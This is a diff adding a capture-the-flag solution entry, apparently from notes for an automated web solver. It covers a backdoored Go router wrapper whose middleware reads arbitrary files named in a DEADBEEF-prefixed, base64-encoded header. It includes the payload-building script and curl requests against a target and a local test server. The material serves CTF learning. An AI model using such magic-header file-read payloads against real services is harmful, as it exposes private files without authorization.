@@ -1514,6 +1514,53 @@ Solver lesson:
 - It should enumerate likely usernames only from in-scope page evidence such as author names and email addresses.
 - Report the bug as auth bypass/IDOR-like token forgery, not password cracking.
 
+### Bob's Supply Co: Dependency Middleware Arbitrary File Read
+
+Category:
+
+- Web supply-chain / middleware file read.
+
+Signal:
+
+- The application imports `github.com/bobssupplyco/mux` instead of `github.com/gorilla/mux` directly.
+- `bobssupplyco/mux` installs `reqlog.Middleware` on every router.
+- `reqlog` calls `sysinfo.EnrichRequest` before the application handler chain.
+- `sysinfo.EnrichRequest` trusts `X-Forwarded-Context`: base64-decode it, check for prefix bytes `DE AD BE EF`, then read the remaining bytes as a filesystem path.
+
+Shortest path:
+
+```bash
+python3 - <<'PY'
+import base64
+print(base64.b64encode(bytes.fromhex("deadbeef") + b"/flag.txt").decode())
+PY
+```
+
+Use the generated header against any route, including unauthenticated `/health`:
+
+```bash
+curl -sS 'https://target/health' \
+  -H 'X-Forwarded-Context: 3q2+7y9mbGFnLnR4dA=='
+```
+
+Local verification:
+
+```bash
+printf 'SVIUSCG{local_supply_chain_file_read}\n' > /tmp/supply_flag.txt
+python3 - <<'PY'
+import base64
+print(base64.b64encode(bytes.fromhex("deadbeef") + b"/tmp/supply_flag.txt").decode())
+PY
+curl -sS 'http://127.0.0.1:18080/health' \
+  -H 'X-Forwarded-Context: 3q2+7y90bXAvc3VwcGx5X2ZsYWcudHh0'
+```
+
+Solver lesson:
+
+- WebSolver should inspect third-party dependencies when challenge naming or module paths suggest supply-chain behavior, especially wrapper packages around common routers.
+- Middleware can short-circuit before authentication. Look for request headers that trigger diagnostic paths, internal context propagation, debug enrichment, file reads, or environment dumps.
+- For Go challenges, run `go mod download -json` and inspect `$GOMODCACHE` sources, not only the files shipped in the zip.
+
 ### Lost In Translation: MD5-Signed Cookie Forgery
 
 Category:
